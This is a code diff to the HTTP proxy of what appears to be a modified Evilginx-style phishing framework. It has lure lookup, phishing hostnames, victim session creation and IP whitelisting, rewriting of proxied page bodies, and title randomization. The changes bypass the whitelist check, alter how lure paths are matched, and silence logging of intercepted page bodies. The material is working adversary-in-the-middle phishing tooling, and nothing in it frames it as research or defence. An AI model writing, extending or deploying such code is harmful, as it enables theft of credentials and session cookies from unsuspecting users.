@@ -334,7 +334,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					log.Important("Request Baru !")
 					sc, err := req.Cookie(p.cookieName)
 
-					if err != nil && !p.isWhitelistedIP(remote_addr) {
+					if err != nil {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							var vv string
 							//fmt.Printf("\n VV:\t %s \n", vv)
@@ -342,7 +342,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							var uv url.Values
 							//fmt.Printf("\n UV:\t %s \n", vv)
 
-							l, err := p.cfg.GetLureByPath(pl_name, req_path)
+							l, err := p.cfg.GetLureByPath(pl_name, req.URL.String())
 							//log.Warning("PL NAME : %s", pl_name)
 							if err == nil {
 								log.Debug("triggered lure for path '%s'", req_path)
@@ -471,7 +471,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									ps.Created = true
 									ps.Index = sid
-									p.whitelistIP(remote_addr, ps.SessionId)
+									//p.whitelistIP(remote_addr, ps.SessionId)
 
 									req_ok = true
 								}
@@ -1087,9 +1087,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
-			log.Warning("body : %s", body)
+			//log.Warning("body : %s", body)
 
-			log.Warning("modify received body")
+			//log.Warning("modify received body")
 			//log.Warning(string(body))
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			log.Warning("mime : %s", mime)
@@ -1207,13 +1207,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 
 										//log.Info("hostname : %s", combineHost(sf.subdomain, sf.domain))
-										log.Warning("body Before patchUrls : %s", body)
+										//log.Warning("body Before patchUrls : %s", body)
 										log.Warning("combineHost(ph.orig_subdomain, ph.domain) : %s", combineHost(ph.orig_subdomain, ph.domain))
 										log.Warning("OWN_phish_hostname :%s", OWN_phish_hostname)
 
 										body = []byte(encodePathInCGIParameter(string(body), combineHost(ph.orig_subdomain, ph.domain)))
 										//body = []byte(encodePathInCGIParameter(string(body), OWN_phish_hostname))
-										log.Warning("body after patchUrls : %s", body)
+										//log.Warning("body after patchUrls : %s", body)
 
 									}
 								}
@@ -1277,7 +1277,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									modifiedString := re_title.ReplaceAllString(string(body), fmt.Sprintf("<title>%s</title>", randomString))
 
 									//fmt.Println("Original String:", string(body))
-									fmt.Println("Modified String:", modifiedString)
+									//fmt.Println("Modified String:", modifiedString)
 									//os.Exit(0)
 									body = []byte(modifiedString)
 								} else {
@@ -2771,7 +2771,7 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
 	p.ip_mtx.Lock()
 	defer p.ip_mtx.Unlock()
 
-	log.Debug("isWhitelistIP: %s", ip_addr)
+	//log.Debug("isWhitelistIP: %s", ip_addr)
 	ct := time.Now()
 	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
 		et := time.Unix(ip_t, 0)
